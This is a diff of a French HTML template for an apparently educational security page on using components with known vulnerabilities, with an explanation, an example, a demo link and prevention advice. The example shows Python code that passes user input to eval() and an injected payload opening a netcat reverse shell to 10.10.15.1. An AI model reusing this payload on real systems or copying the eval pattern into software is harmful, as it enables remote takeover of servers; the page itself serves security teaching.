@@ -1,10 +1,10 @@
 {% extends 'base.html' %}
-{% block title %}composant avec vul{% endblock title %}
+{% block title %}composant vulnérable{% endblock title %}
 {% block content %}
   {% if user.is_authenticated %}
     <!-- navbar navbar-expand-sm -->
       <nav class="navbar navbar-expand-sm navbar-dark bg-secondary col sticky-top mt-56" style="z-index:100;">
-      <a class="navbar-brand" href="#">composant avec vul</a>
+      <a class="navbar-brand" href="#">composant vulnérable</a>
 
       <div class="collapse navbar-collapse" id="navbarSupportedContent">
         <ul class="navbar-nav mr-auto">
@@ -15,41 +15,156 @@
             <a class="nav-link" href="#exemple">Exemples</a>
           </li>
           <li class="nav-item active">
-            <a class="nav-link" href="#demo">demo</a>
+            <a class="nav-link" href="#demo">Démo</a>
           </li>
           <li class="nav-item active">
-            <a class="nav-link" href="#prevention">prevention</a>
+            <a class="nav-link" href="#prevention">Prévention</a>
           </li>
         </ul>
       </div>
     </nav>
     <div class="col-sm-10 p-3 ml-5  mt-9">
-      <div id='explication' class=" mb-4 pt-104 ">
-        <h2  class='ml-5 mb-3'>Explication</h2>
-        <p class="text-justify">qdduqfgbuwakfb dadw da dwakld w dand dakla adjkldaw ad da dajadw adw da akwladw awdknlawdawwabfewfwefkebnfkbewjewkjafbwjafbewjlfbjabgfkljbgfb fkjewbfwefnfjkgbkjabgjeakbwakkjbgadgnjnjewkwfnnekdsgehfksfhkejsbvfbjesfljqfenwjkfnwkfb</p>
-        <p>qdduqfgbuwakfbwabfewfwefkebnfkbewjewkjafbwjafbewjlfbjabgfkljbgfb fkjewbfwefnfjkgb hda k d nkajd nadw ndakwdawn awdankld daw dk;alw adw adw adw admdawdmd md dmd d dmd kjabgjeakbwakkjbgadgnjnjewkwfnnekdsgehfksfhkejsbvfbjesfljqfenwjkfnwkfb</p>
-        <p>qdduqfgbuwakfbwabfewfwefkebnfkbewjewkjafbwjafbewjlfbjabgfkljbgfb fkjewbfwefnfjkgbkjabgjeakbwakkjbgadgnjnjewkwfnnekdsgehfksfhkejsbvfbjesfljqfenwjkfnwkfb</p>
-        <p>qdduqfgbuwakfbwabfewfwefkebnfkbewjewkjafbwjafbewjlfbjabgfkljbgfb fkjewbfwefnfjkgbkjabgjeakbwakkjbgadgnjnjewkwfnnekdsgehfksfhkejsbvfbjesfljqfenwjkfnwkfb</p>
-        <p>qdduqfgbuwakfbwabfewfwefkebnfkbewjewkjafbwjafbewjlfbjabgfkljbgfb fkjewbfwefnfjkgbkjabgjeakbwakkjbgadgnjnjewkwfnnekdsgehfksfhkejsbvfbjesfljqfenwjkfnwkfb</p>
-        <p>qdduqfgbuwakfbwabfewfwefkebnfkbewjewkjafbwjafbewjlfbjabgfkljbgfb fkjewbfwefnfjkgbkjabgjeakbwakkjbgadgnjnjewkwfnnekdsgehfksfhkejsbvfbjesfljqfenwjkfnwkfb</p>
-        <p>qdduqfgbuwakfbwabfewfwefkebnfkbewjewkjafbwjafbewjlfbjabgfkljbgfb fkjewbfwefnfjkgbkjabgjeakbwakkjbgadgnjnjewkwfnnekdsgehfksfhkejsbvfbjesfljqfenwjkfnwkfb</p>
-        <p>qdduqfgbuwakfbwabfewfwefkebnfkbewjewkjafbwjafbewjlfbjabgfkljbgfb fkjewbfwefnfjkgbkjabgjeakbwakkjbgadgnjnjewkwfnnekdsgehfksfhkejsbvfbjesfljqfenwjkfnwkfb</p>
-        <p>qdduqfgbuwakfbwabfewfwefkebnfkbewjewkjafbwjafbewjlfbjabgfkljbgfb fkjewbfwefnfjkgbkjabgjeakbwakkjbgadgnjnjewkwfnnekdsgehfksfhkejsbvfbjesfljqfenwjkfnwkfb</p>
-        <p>qdduqfgbuwakfbwabfewfwefkebnfkbewjewkjafbwjafbewjlfbjabgfkljbgfb fkjewbfwefnfjkgbkjabgjeakbwakkjbgadgnjnjewkwfnnekdsgehfksfhkejsbvfbjesfljqfenwjkfnwkfb</p>
-        <p>qdduqfgbuwakfbwabfewfwefkebnfkbewjewkjafbwjafbewjlfbjabgfkljbgfb fkjewbfwefnfjkgbkjabgjeakbwakkjbgadgnjnjewkwfnnekdsgehfksfhkejsbvfbjesfljqfenwjkfnwkfb</p>
+      <div id='explication' class="text-justify mb-4 pt-104 ">
+        <div class='mt-4 '>
+          <h2  class='ml-5 mb-3'>Explication</h2>
+          <p>
+            Les composants, tels que les bibliothèques, les Framework et autres modules logiciels, s'exécutent avec les mêmes privilèges que l'application. Si un composant vulnérable est exploité, une telle attaque peut faciliter une grave perte de données ou une prise de contrôle du serveur. Les applications et les API utilisant des composants présentant des vulnérabilités connues peuvent saper les défenses des applications et permettre diverses attaques et impacts.
+          </p>
+        </div>
+        <div class='mt-4 mb-5 ml-4'>
+          <ul>
+             <li>
+               <strong>Agents de menace et vecteurs d'attaque :</strong>
+               <p>
+                 bien qu'il soit facile de trouver des exploits déjà écrits pour de nombreuses vulnérabilités connues, d'autres vulnérabilités nécessitent des efforts concentrés pour développer un exploit personnalisé.
+               </p>
+             </li>
+             <li>
+               <strong>Faiblesses en matière de sécurité  : </strong>
+               <p>
+                 la prévalence de ce problème est très répandue. Les modèles de développement à forte composante peuvent conduire les équipes de développement à ne même pas comprendre quels composants elles utilisent dans leur application ou API, et encore moins à les maintenir à jour. Certains scanners comme retire.js aident à la détection, mais la détermination de l'exploitabilité nécessite des efforts supplémentaires.
+               </p>
+             </li>
+             <li>
+               <strong>Impacts :</strong>
+               <p>
+                 bien que certaines vulnérabilités connues n'entraînent que des impacts mineurs, certaines des plus grandes violations à ce jour reposent sur l'exploitation de vulnérabilités connues dans les composants. Selon les actifs que vous protégez, ce risque devrait peut-être figurer en tête de liste.
+               </p>
+             </li>
+          </ul>
+        </div>
+        <div class='mt-4'>
+          <h5> L'application est-elle vulnérable?</h5>
+          <br>
+          <div class='ml-4'>
+            <p>
+              Vous êtes probablement vulnérable:
+              <ul  style=''>
+                <li>
+                  Si vous ne connaissez pas les versions de tous les composants que vous utilisez (côté client et côté serveur). Cela inclut les composants que vous utilisez directement ainsi que les dépendances imbriquées.
+                </li>
+                <li class="mt-2">
+                  Si le logiciel est vulnérable, non pris en charge ou obsolète. Cela inclut le système d'exploitation, le serveur Web / d'applications, le système de gestion de base de données (SGBD), les applications, les API et tous les composants, les environnements d'exécution et les bibliothèques.
+                </li>
+                <li>
+                  Si vous ne recherchez pas régulièrement les vulnérabilités et que vous vous abonnez aux bulletins de sécurité liés aux composants que vous utilisez.
+                </li>
+                <li>
+                  Si vous ne corrigez pas ou ne mettez pas à niveau la plate-forme, les cadres et les dépendances sous-jacents en temps opportun et en fonction des risques. Cela se produit généralement dans les environnements où l'application de correctifs est une tâche mensuelle ou trimestrielle soumise au contrôle des modifications, ce qui laisse les organisations ouvertes à de nombreux jours ou mois d'exposition inutile à des vulnérabilités fixes.
+                </li>
+                <li>
+                  Si les développeurs de logiciels ne testent pas la compatibilité des bibliothèques mises à jour, mises à niveau ou corrigées.
+                </li>
+              </ul>
+            </p>
+          </div>
+        </div>
       </div>
-      <div class=" mb-4">
-        <h2 id='exemple'class='ml-5 mb-3'>Exemples</h2>
-        <p>dadhnwabdnawhda</p>
+      <hr/>
+      <div class="text-justify mb-4 mt-5">
+        <h2 id='exemple'class='ml-5 mb-3'>Exemple</h2>
+        <div class=''>
+          <p>
+            Nous avons un site web pour vendre des vêtements.
+          </p>
+          <p class='mt-4'>
+            Ce site web utilise une API en ligne de commande programmé en python pour pouvoir rapidement voir les stocks de l'entreprise quand on est pas dans les locaux ainsi que modifié quand on possède les droits nécessaires ou tout autre action.
+          </p>
+          <p>
+            Cet API fonctionne notamment avec la commande curl comme ceci :
+          </p>
+          <div class="bg-light mt-4 mb-4">
+            <code>
+              curl -X POST 'https://monsitedevetement.com/api/gerer_sotck/set' --data '{\"name\":\"t-shirt\",\"brand\":\"zara\",\"stock\":\"10\"}'
+            </code>
+          </div>
+          <p>
+            Cette commande permet de mettre le stock de t-shirt de la marque Zara à 10 unités.
+          </p>
+          <p>
+            Ces paramètres seront traité dans le programme suivant :
+          </p>
+          <div class="bg-light mt-4 mb-4">
+            <code>
+              def handlePOST(request):
+              <div class='ml-3'>
+                data = request.POST
+                if eval("data['stock']&gt;=0"):
+                  <div class='ml-3'>
+                    self.stock = data['stock']
+                  </div>
+                else:
+                  <div class='ml-3'>
+                    raise Exception("Negative stock")
+                  </div>
+              </div>
+            </code>
+          </div>
+          <p>
+            On peut voir ici que nous passons un paramètre donnée par l'utilisateur à la fonction eval qui est risque dans ces conditions.
+          </p>
+          <p>
+            Un attaquant ayant connaissance de cela par n'importe quel moyen peux très bien exploité cette vulnérabilités pour récupéré un Shell sur la machine par une commande de ce genre la :
+          </p>
+          <div class="bg-light mt-4 mb-4">
+            <code>
+              "__import__(\'os\').system(\'rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 10.10.15.1 8123 > f\') "
+            </code>
+          </div>
+          <p>
+            Partant de la, c'est une porte ouverte pour récupéré le total accès de la machine.
+          </p>
+        </div>
       </div>
-      <div class=" mb-4">
+      <hr/>
+      <div class=" mb-4 mt-5">
         <h2 id='demo' class='ml-5 mb-3'>Demo</h2>
         <p>aller essaye</p>
-        <a href="http://127.0.0.1:8088/">demo</a>
-
+        <a href="http://localhost:8084">Démo</a>
       </div>
-      <div class=" mb-4">
-        <h2 id='prevention' class='ml-5 mb-3'>Prevention</h2>
+      <hr/>
+      <div class="text-justify mb-4">
+        <h2 id='prevention' class='ml-5 mb-3'>Prévention</h2>
+        <p>
+          Un processus de gestion des correctifs doit être en place pour:
+        </p>
+        <ul>
+          <li>
+            Supprimez les dépendances inutilisées, les fonctionnalités inutiles, les composants, les fichiers et la documentation.
+          </li>
+          <li>
+            Inventoriez en continu les versions des composants côté client et côté serveur (par exemple les frameworks, les bibliothèques) et leurs dépendances à l'aide d'outils tels que les versions, etc. Surveillez en permanence les sources comme CVE pour détecter les vulnérabilités des composants. Utilisez des outils d'analyse de composition logicielle pour automatiser le processus. Abonnez-vous aux alertes par e-mail pour les failles de sécurité liées aux composants que vous utilisez.
+          </li>
+          <li>
+            Obtenez uniquement des composants de sources officielles via des liens sécurisés. Préférez les packages signés pour réduire les risques d'inclusion d'un composant malveillant modifié.
+          </li>
+          <li>
+            Surveillez les bibliothèques et les composants qui ne sont pas gérés ou qui ne créent pas de correctifs de sécurité pour les anciennes versions. Si l'application de correctifs n'est pas possible, envisagez de déployer un correctif visuel pour surveiller, détecter ou protéger contre le problème découvert.
+          </li>
+        </ul>
+        <p>
+          Chaque organisation doit s'assurer qu'il existe un plan continu de surveillance, de tri et d'application des mises à jour ou des changements de configuration pour la durée de vie de l'application ou du portefeuille.
+        </p>
       </div>
     </div>
   {% else %}
